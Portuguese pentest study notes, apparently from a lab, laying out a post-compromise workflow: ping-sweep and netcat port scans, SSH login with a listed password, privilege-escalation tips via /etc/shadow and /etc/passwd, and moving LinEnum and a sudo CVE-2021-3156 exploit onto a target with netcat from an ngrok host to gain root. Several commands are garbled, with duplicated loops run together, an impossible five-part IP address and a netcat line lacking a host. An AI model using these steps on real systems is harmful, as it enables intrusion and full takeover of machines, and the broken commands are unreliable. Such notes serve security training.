---
tags:
  - Pentest
  - WEB
---
# Identificando outros hosts rodando na mesma rede

Com esse código bash, conseguimos *identificar outros hosts que estão presentes na mesma rede*, ou seja, outras máquinas da mesma rede que possam conter outras informações para serem comprometidas

```bash
for i in {1..254}; do (ping -c 1 10.20.20.20.$i &); donefor i in {1..254}; do (ping -c 1 10.20.20.20.$i &); done

for i in {1..254}; do (ping -c 1 10.20.20.20.$i &); donefor i in {1..254}; do (ping -c 1 10.20.20.20.$i | GREP "64 bytes" &); done
```

Caso o servidor não possua **nmap**, temos como fazer um **portscan com nc**:

```shell
nc -w 1 -zv 10.20.20.3 1-500
```

Apos localizar a conexão com o servidor alvo, apenas conectar via ssh:

```shell
ssh bob@10.20.20.3 

password: 12356
```

# Alguns escalamentos de privilégios no Linux:

- Se tiver permissão de LEITURA para /etc/shadow conseguimos pegar as **hashs das senhas** dos usuários e tentar quebrar
- Se tiver permissão de ESCRITA para /etc/shadow conseguimos alterar a senha do **root**
- Se tiver permissão de ESCRITA para /etc/passwd conseguimos ler o arquivo e criar um novo **usuário com permissão de root**

# Transferindo arquivo e encontrando Exploit por meio do LinEnum

Agora, conseguimos clonar um repositório que contém um programa para **facilitar nossa escalação de privilégios**

_Servidor principal que possua o comando wget_

```sh
wget https://github.com/rebootuser/LinEnum.git

ls
LinEnum.sh

nc -lvp 7799 < LinEnum.sh # passando o arquivo
```

_Máquina do Usuário na qual deseja enviar arquivos_

```sh
cd /tmp => nesse siretório será possivel receber o arquivo
nc 10.20.20.2 7799 > lin.sh # recebendo o arquivo
```

- Executando o arquivo recebido:
```sh
bash lin.sh 
```

Com esse arquivo, conseguiremos ver informações que podem ser vulneráveis a Exploits dentro do servidor alvo. **Como por exemplo a versão do Sudo**, pode ser um bom ponto para escalação de privilégios

# Exploits SUDO

- CVE-2021-3156
   - Download: https://github.com/CptGibbon/CVE-2021-3156
   ```sh
    nc 7788 < exploit.c
 ```

Enviaremos novamente para o alvo:

```sh
#Eviando
nc -lvp 7788 < exploit.c

#Recebendo - máquina alvo
nc 4.tcp.ngrok.io 15928 > exploit.c

ls
explot.c
```

_repetir isso para todos os arquivos do exploit_

Assim que executar-mos teremos conseguido escalar os privilégios:

```sh
./exploit
$ whoami
root
$
```

